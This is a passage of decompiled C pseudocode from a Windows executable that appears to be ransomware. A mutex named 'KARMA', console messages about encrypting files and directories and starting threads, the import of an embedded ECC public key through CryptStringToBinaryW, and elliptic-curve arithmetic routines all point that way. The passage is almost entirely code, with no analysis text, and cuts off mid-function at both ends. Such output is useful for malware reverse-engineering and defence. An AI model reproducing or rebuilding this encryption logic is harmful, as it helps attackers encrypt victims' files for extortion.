  int v19; // esi
  __int128 v20; // xmm0
  __int128 v21; // xmm1
  __int128 v22; // xmm0
  __int128 v23; // xmm1
  int i; // eax
  __m128i *v25; // eax
  int v26; // ecx
  _DWORD v27[8]; // [esp+8h] [ebp-80h] BYREF
  __int128 v28; // [esp+28h] [ebp-60h] BYREF
  __int128 v29; // [esp+38h] [ebp-50h]
  __int128 v30; // [esp+48h] [ebp-40h] BYREF
  __int128 v31; // [esp+58h] [ebp-30h]
  __int128 v32; // [esp+68h] [ebp-20h] BYREF
  __int128 v33; // [esp+78h] [ebp-10h]
  char vars0; // [esp+88h] [ebp+0h] BYREF

  *(_QWORD *)((char *)&v32 + 4) = *(_QWORD *)(a2 + 1);
  HIDWORD(v32) = a2[3];
  *(_QWORD *)&v33 = *((_QWORD *)a2 + 2);
  v3 = a2[6];
  *a1 = 1;
  v4 = *a2;
  DWORD2(v33) = v3;
  v5 = a2[7];
  *(_QWORD *)&v30 = 1i64;
  *((_QWORD *)&v30 + 1) = 1024i64;
  v6 = v30;
  *(_QWORD *)&v31 = 0i64;
  *((_QWORD *)&v31 + 1) = 0x20000000000i64;
  v7 = v31;
  v28 = 0ui64;
  v8 = 0u;
  v29 = 0ui64;
  v9 = 0u;
  LODWORD(v32) = v4;
  HIDWORD(v33) = v5;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  a1[4] = 0;
  a1[5] = 0;
  a1[6] = 0;
  a1[7] = 0;
  while ( 1 )
  {
    if ( v4 == 1 )
    {
      for ( result = 1; result < 8; ++result )
      {
        if ( *((_DWORD *)&v32 + result) )
          break;
      }
      if ( result == 8 )
        return result;
    }
    v11 = 256;
    v12 = &vars0;
    while ( 1 )
    {
      v13 = *((_DWORD *)v12 - 1);
      v12 -= 4;
      if ( v13 )
        break;
      v11 -= 32;
      if ( v11 <= 0 )
      {
        if ( !v11 )
          goto LABEL_13;
        break;
      }
    }
    v14 = 0x80000000;
    if ( v13 >= 0 )
    {
      do
      {
        v14 >>= 1;
        --v11;
      }
      while ( (v13 & v14) == 0 );
    }
LABEL_13:
    v15 = 256;
    v16 = &v32;
    while ( 1 )
    {
      v17 = *((_DWORD *)v16 - 1);
      v16 = (__int128 *)((char *)v16 - 4);
      if ( v17 )
        break;
      v15 -= 32;
      if ( v15 <= 0 )
      {
        if ( !v15 )
          goto LABEL_19;
        break;
      }
    }
    v18 = 0x80000000;
    if ( v17 >= 0 )
    {
      do
      {
        v18 >>= 1;
        --v15;
      }
      while ( (v17 & v18) == 0 );
    }
LABEL_19:
    v19 = v11 - v15;
    if ( v19 < 0 )
    {
      v20 = v32;
      v19 = -v19;
      v21 = v33;
      v32 = v6;
      v33 = v7;
      v6 = v20;
      v7 = v21;
      v22 = v8;
      v23 = v9;
      v8 = *(_OWORD *)a1;
      v9 = *((_OWORD *)a1 + 1);
      *(_OWORD *)a1 = v22;
      v30 = v6;
      v31 = v7;
      v28 = v8;
      v29 = v9;
      *((_OWORD *)a1 + 1) = v23;
    }
    sub_401000(v27, (int *)&v30, v19);
    for ( i = 0; i < 8; i += 4 )
      *(__int128 *)((char *)&v32 + i * 4) = (__int128)_mm_xor_si128(
                                                        *(__m128i *)&v27[i],
                                                        *(__m128i *)((char *)&v32 + i * 4));
    sub_401000(v27, (int *)&v28, v19);
    v25 = (__m128i *)a1;
    v26 = 2;
    do
    {
      ++v25;
      v25[-1] = _mm_xor_si128(*(__m128i *)((char *)&v25[-1] + (char *)v27 - (char *)a1), v25[-1]);
      --v26;
    }
    while ( v26 );
    v4 = v32;
  }
}
// 401240: using guessed type _DWORD var_80[8];

//----- (00401480) --------------------------------------------------------
int __fastcall sub_401480(int *a1, __m128i *a2)
{
  int result; // eax
  __m128i *v3; // esi
  int i; // eax
  int *v6; // eax
  int v7; // ecx
  char *v8; // ecx
  int v9[8]; // [esp+8h] [ebp-20h] BYREF

  result = 0;
  v3 = a2;
  while ( !a1[result] )
  {
    if ( (unsigned int)++result >= 8 )
    {
      if ( result == 8 )
      {
        a2->m128i_i32[0] = 0;
        a2->m128i_i32[1] = 0;
        a2->m128i_i32[2] = 0;
        a2->m128i_i32[3] = 0;
        a2[1].m128i_i32[0] = 0;
        a2[1].m128i_i32[1] = 0;
        a2[1].m128i_i32[2] = 0;
        a2[1].m128i_i32[3] = 0;
        return result;
      }
      break;
    }
  }
  sub_401240(v9, a1);
  sub_4010F0(v9, (int)v9, v3);
  for ( i = 0; i < 8; i += 4 )
    *(__m128i *)&v9[i] = _mm_xor_si128(*(__m128i *)&a1[i], *(__m128i *)&v9[i]);
  sub_4010F0(v3->m128i_i32, (int)a1, a1);
  sub_4010F0(a1, (int)v9, v9);
  v9[0] ^= 1u;
  v6 = a1;
  v7 = 2;
  do
  {
    v6 += 4;
    *((__m128i *)v6 - 1) = _mm_xor_si128(*(__m128i *)((char *)v6 + (char *)v9 - (char *)a1 - 16), *((__m128i *)v6 - 1));
    --v7;
  }
  while ( v7 );
  sub_4010F0(v9, (int)v9, a1);
  v8 = (char *)((char *)v9 - (char *)v3);
  result = 2;
  do
  {
    ++v3;
    v3[-1] = _mm_xor_si128(*(__m128i *)((char *)v3 + (_DWORD)v8 - 16), v3[-1]);
    --result;
  }
  while ( result );
  return result;
}
// 401480: using guessed type int var_20[8];

//----- (004015A0) --------------------------------------------------------
__m128i *__fastcall sub_4015A0(int *a1, __m128i *a2, int *a3, __m128i *a4)
{
  __m128i *v4; // esi
  int v6; // ecx
  __m128i *result; // eax
  int v8; // ecx
  int v9; // ecx
  int v10; // ecx
  int v11; // ecx
  int *v12; // ebx
  int v13; // edx
  int v14; // ecx
  int *v15; // edx
  int v16; // eax
  int v17; // ecx
  int i; // eax
  int j; // eax
  int v20; // ebx
  int *v21; // eax
  int v22; // ecx
  int k; // eax
  int v24; // eax
  char *v25; // ecx
  int v26[8]; // [esp+8h] [ebp-88h] BYREF
  int v27[8]; // [esp+28h] [ebp-68h] BYREF
  int v28[8]; // [esp+48h] [ebp-48h] BYREF
  int v29; // [esp+68h] [ebp-28h] BYREF
  __int64 v30; // [esp+6Ch] [ebp-24h]
  int v31; // [esp+74h] [ebp-1Ch]
  int v32; // [esp+78h] [ebp-18h]
  int v33; // [esp+7Ch] [ebp-14h]
  int v34; // [esp+80h] [ebp-10h]
  __m128i *v35; // [esp+84h] [ebp-Ch]
  int v36; // [esp+88h] [ebp-8h]
  int v37; // [esp+8Ch] [ebp-4h]

  v4 = a2;
  v6 = 0;
  while ( 1 )
  {
    result = a4;
    if ( a3[v6] )
      break;
    if ( (unsigned int)++v6 >= 8 )
    {
      if ( v6 == 8 )
      {
        v8 = 0;
        while ( !a4->m128i_i32[v8] )
        {
          if ( (unsigned int)++v8 >= 8 )
          {
            if ( v8 == 8 )
              return result;
            goto LABEL_9;
          }
        }
      }
      break;
    }
  }
LABEL_9:
  v9 = 0;
  while ( !a1[v9] )
  {
    if ( (unsigned int)++v9 >= 8 )
    {
      if ( v9 == 8 )
      {
        v10 = 0;
        while ( !a2->m128i_i32[v10] )
        {
          if ( (unsigned int)++v10 >= 8 )
          {
            if ( v10 != 8 )
              goto LABEL_18;
            *a1 = *a3;
            a1[1] = a3[1];
            a1[2] = a3[2];
            a1[3] = a3[3];
            a1[4] = a3[4];
            a1[5] = a3[5];
            a1[6] = a3[6];
            a1[7] = a3[7];
            a2->m128i_i32[0] = a4->m128i_i32[0];
            a2->m128i_i32[1] = a4->m128i_i32[1];
            a2->m128i_i32[2] = a4->m128i_i32[2];
            a2->m128i_i32[3] = a4->m128i_i32[3];
            a2[1].m128i_i32[0] = a4[1].m128i_i32[0];
            a2[1].m128i_i32[1] = a4[1].m128i_i32[1];
            result = (__m128i *)a4[1].m128i_i32[3];
            a2[1].m128i_i32[2] = a4[1].m128i_i32[2];
            a2[1].m128i_i32[3] = (__int32)result;
            return result;
          }
        }
      }
      break;
    }
  }
LABEL_18:
  v37 = 0;
  v11 = (char *)a1 - (char *)a3;
  v12 = a3;
  v36 = (char *)a1 - (char *)a3;
  do
  {
    if ( *(int *)((char *)v12 + v11) != *v12 )
    {
      v37 = (char *)v27 - (char *)a4;
      v14 = 2;
      do
      {
        ++result;
        *(__m128i *)((char *)&result[-1] + (char *)v27 - (char *)a4) = _mm_xor_si128(
                                                                         *(__m128i *)((char *)&result[-1]
                                                                                    + (char *)a2
                                                                                    - (char *)a4),
                                                                         result[-1]);
        --v14;
      }
      while ( v14 );
      v15 = a3;
      v16 = v36;
      v17 = 2;
      do
      {
        v15 += 4;
        *(__m128i *)((char *)v15 + (char *)v26 - (char *)a3 - 16) = _mm_xor_si128(
                                                                      *(__m128i *)((char *)v15 + v16 - 16),
                                                                      *((__m128i *)v15 - 1));
        --v17;
      }
      while ( v17 );
      sub_401240(v28, v26);
      sub_4010F0(v28, (int)v28, v27);
      sub_4010F0(&v29, (int)v28, v28);
      for ( i = 0; i < 8; i += 4 )
        *(__m128i *)((char *)&v29 + i * 4) = _mm_xor_si128(*(__m128i *)&v28[i], *(__m128i *)((char *)&v29 + i * 4));
      for ( j = 0; j < 8; j += 4 )
        *(__m128i *)((char *)&v29 + j * 4) = _mm_xor_si128(*(__m128i *)&v26[j], *(__m128i *)((char *)&v29 + j * 4));
      v20 = v29 ^ 1;
      v21 = a1;
      v29 ^= 1u;
      v22 = 2;
      do
      {
        v21 += 4;
        *((__m128i *)v21 - 1) = _mm_xor_si128(
                                  *(__m128i *)((char *)v21 + (char *)&v29 - (char *)a1 - 16),
                                  *((__m128i *)v21 - 1));
        --v22;
      }
      while ( v22 );
      sub_4010F0(v27, (int)a1, v28);
      for ( k = 0; k < 8; k += 4 )
        *(__m128i *)&v27[k] = _mm_xor_si128(*(__m128i *)((char *)&v29 + k * 4), *(__m128i *)&v27[k]);
      v24 = 2;
      v25 = (char *)((char *)v27 - (char *)v4);
      do
      {
        ++v4;
        v4[-1] = _mm_xor_si128(*(__m128i *)((char *)v4 + (_DWORD)v25 - 16), v4[-1]);
        --v24;
      }
      while ( v24 );
      *(_QWORD *)(a1 + 1) = v30;
      a1[3] = v31;
      a1[4] = v32;
      a1[5] = v33;
      a1[6] = v34;
      result = v35;
      *a1 = v20;
      a1[7] = (int)result;
      return result;
    }
    ++v12;
    ++v37;
    v11 = v36;
  }
  while ( v37 < 8 );
  v13 = 0;
  while ( *(__int32 *)((char *)result->m128i_i32 + (char *)v4 - (char *)a4) == result->m128i_i32[0] )
  {
    ++v13;
    result = (__m128i *)((char *)result + 4);
    if ( v13 >= 8 )
      return (__m128i *)sub_401480(a1, v4);
  }
  *a1 = 0;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  a1[4] = 0;
  a1[5] = 0;
  a1[6] = 0;
  a1[7] = 0;
  v4->m128i_i32[0] = 0;
  v4->m128i_i32[1] = 0;
  v4->m128i_i32[2] = 0;
  v4->m128i_i32[3] = 0;
  v4[1].m128i_i32[0] = 0;
  v4[1].m128i_i32[1] = 0;
  v4[1].m128i_i32[2] = 0;
  v4[1].m128i_i32[3] = 0;
  return result;
}
// 4015A0: using guessed type int var_68[8];
// 4015A0: using guessed type int var_88[8];
// 4015A0: using guessed type int var_48[8];

//----- (004018C0) --------------------------------------------------------
int __fastcall sub_4018C0(int *a1, __m128i *a2, int a3)
{
  int v3; // eax
  int v6; // esi
  int v7; // edx
  unsigned int v8; // ecx
  int v9; // ecx
  int v10; // esi
  int v11; // edx
  __int32 v12; // eax
  int result; // eax
  __m128i v14; // [esp+Ch] [ebp-40h] BYREF
  int v15; // [esp+1Ch] [ebp-30h]
  int v16; // [esp+20h] [ebp-2Ch]
  int v17; // [esp+24h] [ebp-28h]
  int v18; // [esp+28h] [ebp-24h]
  int v19; // [esp+2Ch] [ebp-20h] BYREF
  int v20; // [esp+30h] [ebp-1Ch]
  int v21; // [esp+34h] [ebp-18h]
  int v22; // [esp+38h] [ebp-14h]
  int v23; // [esp+3Ch] [ebp-10h]
  int v24; // [esp+40h] [ebp-Ch]
  int v25; // [esp+44h] [ebp-8h]
  int v26; // [esp+48h] [ebp-4h]

  v3 = 256;
  v6 = a3 + 32;
  while ( 1 )
  {
    v7 = *(_DWORD *)(v6 - 4);
    v6 -= 4;
    if ( v7 )
      break;
    v3 -= 32;
    if ( v3 <= 0 )
    {
      if ( !v3 )
        goto LABEL_7;
      break;
    }
  }
  v8 = 0x80000000;
  if ( v7 >= 0 )
  {
    do
    {
      v8 >>= 1;
      --v3;
    }
    while ( (v7 & v8) == 0 );
  }
LABEL_7:
  v9 = 0;
  v10 = v3 - 1;
  v11 = 0;
  v19 = 0;
  v20 = 0;
  v21 = 0;
  v22 = 0;
  v23 = 0;
  v24 = 0;
  v25 = 0;
  v26 = 0;
  memset(&v14, 0, sizeof(v14));
  v15 = 0;
  v16 = 0;
  v17 = 0;
  v18 = 0;
  if ( v3 - 1 >= 0 )
  {
    do
    {
      sub_401480(&v19, &v14);
      if ( ((*(_DWORD *)(a3 + 4 * ((unsigned int)v10 >> 5)) >> (v10 & 0x1F)) & 1) != 0 )
        sub_4015A0(&v19, &v14, a1, a2);
      --v10;
    }
    while ( v10 >= 0 );
    v11 = v20;
    v9 = v19;
  }
  a1[2] = v21;
  a1[3] = v22;
  a1[4] = v23;
  a1[5] = v24;
  a1[6] = v25;
  a1[7] = v26;
  v12 = v14.m128i_i32[0];
  *a1 = v9;
  a1[1] = v11;
  a2->m128i_i64[0] = __PAIR64__(v14.m128i_u32[1], v12);
  a2->m128i_i64[1] = v14.m128i_i64[1];
  a2[1].m128i_i32[0] = v15;
  a2[1].m128i_i32[1] = v16;
  a2[1].m128i_i32[2] = v17;
  result = v18;
  a2[1].m128i_i32[3] = v18;
  return result;
}

//----- (004019E0) --------------------------------------------------------
int __cdecl sub_4019E0(unsigned int a1)
{
  int v1; // ecx
  int v2; // eax
  unsigned int v3; // esi
  int v4; // ebx
  unsigned int v5; // eax
  _DWORD *v6; // ecx
  int v7; // eax
  int v8; // eax
  int i; // eax
  int j; // eax
  int k; // eax
  int v12; // ecx
  unsigned int v13; // ecx
  unsigned int v14; // esi
  int v15; // edx
  char v16; // al
  int v18[8]; // [esp+Ch] [ebp-44h] BYREF
  int v19[9]; // [esp+2Ch] [ebp-24h] BYREF

  v2 = 0;
  v3 = dword_406004;
  v4 = v1;
  while ( !*(_DWORD *)(dword_406004 + 4 * v2) )
  {
    if ( (unsigned int)++v2 >= 8 )
    {
      if ( v2 == 8 )
      {
        v5 = 0;
        v6 = (_DWORD *)(dword_406004 + 32);
        while ( !*v6 )
        {
          ++v5;
          ++v6;
          if ( v5 >= 8 )
          {
            if ( v5 == 8 )
              return 0;
            goto LABEL_9;
          }
        }
      }
      break;
    }
  }
LABEL_9:
  v7 = 0;
  while ( !*(_DWORD *)(dword_406004 + 4 * v7) )
  {
    if ( (unsigned int)++v7 >= 8 )
    {
      if ( v7 == 8 )
      {
        v8 = 0;
        while ( !*(_DWORD *)(dword_406004 + 32 + 4 * v8) )
        {
          if ( (unsigned int)++v8 >= 8 )
          {
            if ( v8 != 8 )
              goto LABEL_17;
LABEL_26:
            if ( a1 > v3 + 63 || a1 + 63 < v3 )
            {
              *(_OWORD *)a1 = *(_OWORD *)v3;
              *(_OWORD *)(a1 + 16) = *(_OWORD *)(v3 + 16);
              *(_OWORD *)(a1 + 32) = *(_OWORD *)(v3 + 32);
              *(_OWORD *)(a1 + 48) = *(_OWORD *)(v3 + 48);
            }
            else
            {
              v13 = a1;
              v14 = v3 - a1;
              v15 = 64;
              do
              {
                v16 = *(_BYTE *)(v14 + v13++);
                *(_BYTE *)(v13 - 1) = v16;
                --v15;
              }
              while ( v15 );
            }
            sub_4018C0((int *)a1, (__m128i *)(a1 + 32), v4);
            return 1;
          }
        }
      }
      break;
    }
  }
LABEL_17:
  sub_4010F0(v19, dword_406004, (_BYTE *)dword_406004);
  sub_4010F0(v18, (int)v19, (_BYTE *)v3);
  for ( i = 0; i < 8; i += 4 )
    *(__m128i *)&v19[i] = _mm_xor_si128(*(__m128i *)&v18[i], *(__m128i *)&v19[i]);
  for ( j = 0; j < 8; j += 4 )
    *(__m128i *)&v19[j] = _mm_xor_si128(*(__m128i *)(j * 4 + 4210960), *(__m128i *)&v19[j]);
  sub_4010F0(v18, v3 + 32, (_BYTE *)(v3 + 32));
  for ( k = 0; k < 8; k += 4 )
    *(__m128i *)&v19[k] = _mm_xor_si128(*(__m128i *)&v18[k], *(__m128i *)&v19[k]);
  sub_4010F0(v18, v3, (_BYTE *)(v3 + 32));
  v12 = 0;
  while ( v19[v12] == v18[v12] )
  {
    if ( ++v12 >= 8 )
      goto LABEL_26;
  }
  return 0;
}
// 4019F0: variable 'v1' is possibly undefined
// 406004: using guessed type int dword_406004;
// 4019E0: using guessed type int var_24[9];
// 4019E0: using guessed type int var_44[8];

//----- (00401B70) --------------------------------------------------------
DWORD __usercall start@<eax>(SIZE_T a1@<ebx>, int a2@<edi>)
{
  __int16 *v2; // ecx
  __int16 v3; // ax
  __int16 *v4; // ecx
  const wchar_t *v5; // edx
  __int16 *v7; // ecx
  wchar_t v8; // ax
  DWORD i; // eax
  HANDLE StdHandle; // eax
  DWORD result; // eax
  __int16 *CommandLineW; // eax
  _DWORD *v13; // eax
  int v14; // esi
  DWORD v15; // [esp-Ch] [ebp-21Ch]
  __int16 v16; // [esp+2h] [ebp-20Eh] BYREF
  __int16 Buffer[260]; // [esp+4h] [ebp-20Ch] BYREF
  int v18; // [esp+20Ch] [ebp-4h] BYREF

  v2 = &v16;
  do
  {
    v3 = v2[(((char *)L"[+] Checking if already started..." - (char *)Buffer) >> 1) + 1];
    *++v2 = v3;
  }
  while ( v3 );
  v4 = Buffer;
  v5 = L"\n";
  while ( *v4++ )
    ;
  v7 = v4 - 2;
  do
  {
    v8 = *v5;
    *++v7 = *v5++;
  }
  while ( v8 );
  for ( i = 0; Buffer[i]; ++i )
    ;
  v15 = i;
  StdHandle = GetStdHandle(0xFFFFFFF5);
  WriteConsoleW(StdHandle, Buffer, v15, 0, 0);
  CreateMutexA(0, 0, "KARMA");
  result = GetLastError();
  if ( result != 183 )
  {
    dword_406000 = (int)sub_402280();
    sub_4021B0((int)L"[+] Getting argument list...", 0);
    CommandLineW = (__int16 *)GetCommandLineW();
    v13 = sub_402070(CommandLineW, &v18);
    v14 = (int)v13;
    if ( v18 <= 1 )
    {
      sub_401DF0(a1, a2, (int)v13);
      sub_4021B0((int)L"[+] Starting all threads...", 0);
      sub_4035D0();
    }
    else
    {
      sub_4021B0((int)L"   [-] Argument: ", (__int16 *)v13[1]);
      if ( sub_401D60(*(LPCWSTR *)(v14 + 4)) )
      {
        sub_401DF0(a1, a2, v14);
        sub_401D10((int)Buffer, *(_DWORD *)(v14 + 4));
        sub_401D30(Buffer, L"\\");
        sub_4021B0((int)L"[+] Encrypting directory: ", Buffer);
        sub_402D30(Buffer);
      }
      else
      {
        sub_401DF0(a1, a2, v14);
        sub_4021B0((int)L"[+] Encrypting file: ", *(__int16 **)(v14 + 4));
        sub_402760(*(LPCWSTR *)(v14 + 4));
      }
    }
    sub_402320();
    ExitProcess(0);
  }
  return result;
}
// 404180: using guessed type wchar_t aCheckingIfAlre[35];
// 4041C8: using guessed type wchar_t aGettingArgumen[29];
// 404204: using guessed type wchar_t aArgument[18];
// 404228: using guessed type wchar_t asc_404228[2];
// 40422C: using guessed type wchar_t aEncryptingDire[27];
// 404264: using guessed type wchar_t aEncryptingFile[22];
// 404290: using guessed type wchar_t aStartingAllThr[28];
// 404368: using guessed type wchar_t asc_404368[2];
// 406000: using guessed type int dword_406000;
// 401B70: using guessed type __int16 Buffer[260];

//----- (00401D00) --------------------------------------------------------
int __thiscall sub_401D00(_WORD *this)
{
  int result; // eax

  result = 0;
  if ( *this )
  {
    do
      ++result;
    while ( this[result] );
  }
  return result;
}

//----- (00401D10) --------------------------------------------------------
_WORD *__fastcall sub_401D10(int a1, int a2)
{
  _WORD *result; // eax
  int v3; // edx
  __int16 v4; // cx

  result = (_WORD *)(a1 - 2);
  v3 = ((a2 - a1) >> 1) + 1;
  do
  {
    v4 = result[v3];
    *++result = v4;
  }
  while ( v4 );
  return result;
}

//----- (00401D30) --------------------------------------------------------
_WORD *__fastcall sub_401D30(_WORD *a1, __int16 *a2)
{
  _WORD *v3; // eax
  _WORD *v5; // eax
  __int16 v6; // cx

  v3 = a1;
  while ( *v3++ )
    ;
  v5 = v3 - 2;
  do
  {
    v6 = *a2;
    *++v5 = *a2++;
  }
  while ( v6 );
  return a1;
}

//----- (00401D60) --------------------------------------------------------
DWORD __thiscall sub_401D60(LPCWSTR lpFileName)
{
  int v2; // edx
  LPCWSTR v3; // eax
  int v4; // ecx
  LPCWSTR v5; // ecx
  int v6; // edx
  WCHAR v7; // si
  WCHAR v8; // ax
  DWORD FileAttributesW; // eax

  if ( lpFileName )
  {
    v2 = *lpFileName;
    if ( v2 != 92 || lpFileName[1] != 92 )
      goto LABEL_23;
    v3 = lpFileName + 2;
    while ( 1 )
    {
      v4 = *v3;
      if ( v4 == 92 )
        break;
      ++v3;
      if ( !(_WORD)v4 )
      {
        v3 = 0;
        break;
      }
    }
    if ( v3 )
    {
LABEL_23:
      if ( v2 != 92 )
        goto LABEL_18;
      v5 = lpFileName + 2;
      if ( lpFileName[1] != 92 )
        goto LABEL_18;
      v6 = 0;
      if ( !*v5 )
        goto LABEL_18;
      v7 = *v5;
      do
      {
        if ( v7 == 92 )
        {
          if ( v6 )
            goto LABEL_18;
          v6 = 1;
        }
        v8 = v5[1];
        ++v5;
        v7 = v8;
      }
      while ( v8 );
      if ( !v6 )
      {
LABEL_18:
        FileAttributesW = GetFileAttributesW(lpFileName);
        if ( FileAttributesW != -1 )
          return FileAttributesW & 0x10;
      }
    }
  }
  return 0;
}

//----- (00401DF0) --------------------------------------------------------
LPCVOID __usercall sub_401DF0@<eax>(SIZE_T a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  _WORD *v3; // ecx
  __int16 v4; // ax
  __int16 *v5; // ecx
  const wchar_t *v6; // edx
  __int16 *v8; // ecx
  wchar_t v9; // ax
  DWORD i; // eax
  HANDLE StdHandle; // eax
  HMODULE LibraryA; // eax
  BOOL (__stdcall *CryptStringToBinaryW)(LPCWSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *); // edx
  int v14; // ecx
  HANDLE ProcessHeap; // eax
  BYTE *v16; // eax
  HMODULE v17; // ecx
  BYTE *v18; // ebx
  BOOL (__stdcall *ProcAddress)(LPCWSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *); // eax
  DWORD v20; // ecx
  HMODULE v21; // eax
  BOOL (__stdcall *v22)(LPCWSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *); // edx
  DWORD v23; // ecx
  HANDLE v24; // eax
  const void *v25; // eax
  HMODULE v26; // ecx
  const void *v27; // ebx
  BOOL (__stdcall *v28)(LPCWSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *); // eax
  int v29; // ecx
  LPCVOID result; // eax
  DWORD v31; // [esp-18h] [ebp-224h]
  SIZE_T v32; // [esp-4h] [ebp-210h] BYREF
  __int16 Buffer[260]; // [esp+0h] [ebp-20Ch] BYREF
  SIZE_T dwBytes; // [esp+208h] [ebp-4h] BYREF

  v3 = (_WORD *)&v32 + 1;
  do
  {
    v4 = v3[(((char *)L"[+] Trying to import ECC public key..." - (char *)Buffer) >> 1) + 1];
    *++v3 = v4;
  }
  while ( v4 );
  v5 = Buffer;
  v6 = L"\n";
  while ( *v5++ )
    ;
  v8 = v5 - 2;
  do
  {
    v9 = *v6;
    *++v8 = *v6++;
  }
  while ( v9 );
  for ( i = 0; Buffer[i]; ++i )
    ;
  v32 = a1;
  v31 = i;
  StdHandle = GetStdHandle(0xFFFFFFF5);
  WriteConsoleW(StdHandle, Buffer, v31, 0, 0);
  LibraryA = hModule;
  dwBytes = 0;
  if ( !hModule )
  {
    LibraryA = LoadLibraryA("crypt32.dll");
    hModule = LibraryA;
  }
  CryptStringToBinaryW = (BOOL (__stdcall *)(LPCWSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))dword_406010;
  if ( !dword_406010 )
  {
    CryptStringToBinaryW = (BOOL (__stdcall *)(LPCWSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))GetProcAddress(LibraryA, "CryptStringToBinaryW");
    dword_406010 = (int)CryptStringToBinaryW;
  }
  v14 = 0;
  do
    ++v14;
  while ( word_405280[v14] );
  ((void (__stdcall *)(WCHAR *, int, int, _DWORD, SIZE_T *, _DWORD, _DWORD, int, int, SIZE_T))CryptStringToBinaryW)(
    word_405280,
    v14,
    1,
    0,
    &dwBytes,
    0,
    0,
    a2,
    a3,
    v32);
  v32 = dwBytes;
  ProcessHeap = GetProcessHeap();
  v16 = (BYTE *)HeapAlloc(ProcessHeap, 0, v32);
  v17 = hModule;
  v18 = v16;
  dword_406004 = (int)v16;
  if ( !hModule )
  {
    v17 = LoadLibraryA("crypt32.dll");
    hModule = v17;
  }
  ProcAddress = (BOOL (__stdcall *)(LPCWSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))dword_406010;
  if ( !dword_406010 )
  {
    ProcAddress = (BOOL (__stdcall *)(LPCWSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))GetProcAddress(
                                                                                                  v17,
                                                                                                  "CryptStringToBinaryW");
    dword_406010 = (int)ProcAddress;
  }
  v20 = 0;
  do
    ++v20;
  while ( word_405280[v20] );
  ProcAddress(word_405280, v20, 1, v18, &dwBytes, 0, 0);
  v21 = hModule;
  if ( !hModule )
  {
    v21 = LoadLibraryA("crypt32.dll");
    hModule = v21;
  }
  v22 = (BOOL (__stdcall *)(LPCWSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))dword_406010;
  if ( !dword_406010 )
  {
    v22 = (BOOL (__stdcall *)(LPCWSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))GetProcAddress(
                                                                                          v21,
                                                                                          "CryptStringToBinaryW");
    dword_406010 = (int)v22;
  }
  v23 = 0;
  do
    ++v23;
  while ( word_404598[v23] );
  v22(word_404598, v23, 1, 0, &dwBytes, 0, 0);
  v32 = dwBytes + 1;
  v24 = GetProcessHeap();
  v25 = HeapAlloc(v24, 0, v32);
  v26 = hModule;
  v27 = v25;
  lpBuffer = v25;
  if ( !hModule )
  {
    v26 = LoadLibraryA("crypt32.dll");
    hModule = v26;
  }
  v28 = (BOOL (__stdcall *)(LPCWSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))dword_406010;
  if ( !dword_406010 )
  {
    v28 = (BOOL (__stdcall *)(LPCWSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *))GetProcAddress(
                                                                                          v26,
                                                                                          "CryptStringToBinaryW");
    dword_406010 = (int)v28;
  }
  v29 = 0;
  do
    ++v29;
  while ( word_404598[v29] );
  HIWORD(v32) = 0;
  ((void (__stdcall *)(WCHAR *, int, int, const void *))v28)(word_404598, v29, 1, v27);
  result = lpBuffer;
  *((_BYTE *)lpBuffer + dwBytes) = 0;
  return result;
}
// 401DF0: could not find valid save-restore pair for ebx
// 401DF0: could not find valid save-restore pair for edi
// 401DF0: could not find valid save-restore pair for esi
// 404318: using guessed type wchar_t aTryingToImport[39];
// 404368: using guessed type wchar_t asc_404368[2];
// 404598: using guessed type WCHAR word_404598[1652];
// 405280: using guessed type WCHAR word_405280[90];
// 406004: using guessed type int dword_406004;
// 406010: using guessed type int dword_406010;
// 401DF0: using guessed type __int16 Buffer[260];

//----- (00402070) --------------------------------------------------------
_DWORD *__fastcall sub_402070(__int16 *a1, _DWORD *a2)
{
  __int16 *v2; // edi
  int v3; // eax
  unsigned int v4; // eax
  unsigned int v5; // esi
  _DWORD *result; // eax
  int v7; // ebx
  _DWORD *v8; // ecx
  int v9; // esi
  __int16 v10; // dx
  char v11; // cl
  _WORD *v12; // eax
  _WORD *v14; // [esp+10h] [ebp-Ch]
  _DWORD *v15; // [esp+14h] [ebp-8h]
  char v16; // [esp+19h] [ebp-3h]
  char v17; // [esp+1Ah] [ebp-2h]
  char v18; // [esp+1Bh] [ebp-1h]

  v2 = a1;
  v3 = 0;
  if ( *a1 )
  {
    do
      ++v3;
    while ( a1[v3] );
  }
  v4 = v3 + 2;
  v5 = v4 >> 1;
  result = GlobalAlloc(0, 4 * ((v4 >> 1) + v4) + 4);
  v15 = result;
  v7 = 0;
  v18 = 1;
  v17 = 0;
  v8 = &result[2 * v5 + 2];
  v9 = 0;
  *result = v8;
  v10 = *v2;
  v14 = v8;
  v11 = 0;
  v16 = 0;
  if ( *v2 )
  {
    v12 = v14;
    do
    {
      if ( v11 )
      {
        if ( v10 == 34 )
        {
          v11 = 0;
          v16 = 0;
        }
        else
        {
LABEL_18:
          ++v9;
          *v12++ = v10;
        }
      }
      else
      {
        switch ( v10 )
        {
          case 9:
          case 10:
          case 13:
          case 32:
            if ( v17 )
            {
              ++v9;
              *v12++ = 0;
            }
            v11 = v16;
            v17 = 0;
            v18 = 1;
            break;
          case 34:
            v11 = 1;
            v16 = 1;
            v17 = 1;
            if ( v18 )
              v15[v7++] = v12;
            v18 = 0;
            break;
          default:
            v17 = 1;
            if ( v18 )
              v15[v7++] = v12;
            v11 = v16;
            v18 = 0;
            goto LABEL_18;
        }
      }
      v10 = v2[1];
      ++v2;
    }
    while ( v10 );
    result = v15;
  }
  v14[v9] = 0;
  result[v7] = 0;
  *a2 = v7;
  return result;
}

//----- (004021B0) --------------------------------------------------------
BOOL __fastcall sub_4021B0(int a1, __int16 *a2)
{
  _WORD *v2; // esi
  int v3; // ecx
